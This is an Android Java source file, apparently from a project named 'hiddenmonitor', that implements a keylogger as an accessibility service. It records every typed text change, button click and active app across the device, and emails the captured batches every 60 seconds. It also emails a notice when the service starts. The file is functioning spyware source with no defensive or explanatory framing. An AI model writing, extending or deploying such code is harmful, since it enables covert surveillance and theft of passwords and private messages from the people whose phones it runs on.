package com.example.hiddenmonitor;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;

public class KeyloggerService extends AccessibilityService {
    
    private static final String TAG = "KeyloggerService";
    private EmailSender emailSender;
    private StringBuilder keystrokeBuffer = new StringBuilder();
    private long lastSendTime = System.currentTimeMillis();
    private static final long SEND_INTERVAL = 60000; // Send every 60 seconds
    private String currentApp = "";
    
    @Override
    public void onCreate() {
        super.onCreate();
        emailSender = new EmailSender(this);
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Get current app
        if (event.getPackageName() != null) {
            String packageName = event.getPackageName().toString();
            if (!packageName.equals(currentApp)) {
                currentApp = packageName;
                keystrokeBuffer.append("\n[App: ").append(packageName).append("]\n");
            }
        }
        
        // Track text input
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                String text = event.getText().toString();
                keystrokeBuffer.append(text);
                Log.d(TAG, "Text: " + text);
            }
        }
        
        // Track button clicks
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            String buttonText = getButtonText(event);
            keystrokeBuffer.append("[CLICK: ").append(buttonText).append("] ");
        }
        
        // Send batch if interval reached
        if (System.currentTimeMillis() - lastSendTime > SEND_INTERVAL) {
            sendKeystrokeBatch();
        }
    }
    
    private String getButtonText(AccessibilityEvent event) {
        if (event.getSource() != null && event.getSource().getText() != null) {
            return event.getSource().getText().toString();
        }
        return "Unknown";
    }
    
    private void sendKeystrokeBatch() {
        if (keystrokeBuffer.length() > 0) {
            String subject = "⌨️ Keystroke Report - " + System.currentTimeMillis();
            String body = "Captured keystrokes and clicks:\n\n" + 
                         keystrokeBuffer.toString() + "\n\n" +
                         "End of report";
            
            emailSender.sendEmail(subject, body);
            FileLogger.log(this, "Sent keystroke batch: " + keystrokeBuffer.length() + " chars");
            
            keystrokeBuffer = new StringBuilder();
            lastSendTime = System.currentTimeMillis();
        }
    }
    
    @Override
    public void onInterrupt() {
        sendKeystrokeBatch(); // Send any remaining data
    }
    
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
        
        Log.d(TAG, "Keylogger service connected");
        emailSender.sendEmail("Keylogger Started", "Keylogger service activated");
        FileLogger.log(this, "Keylogger service started");
    }
}
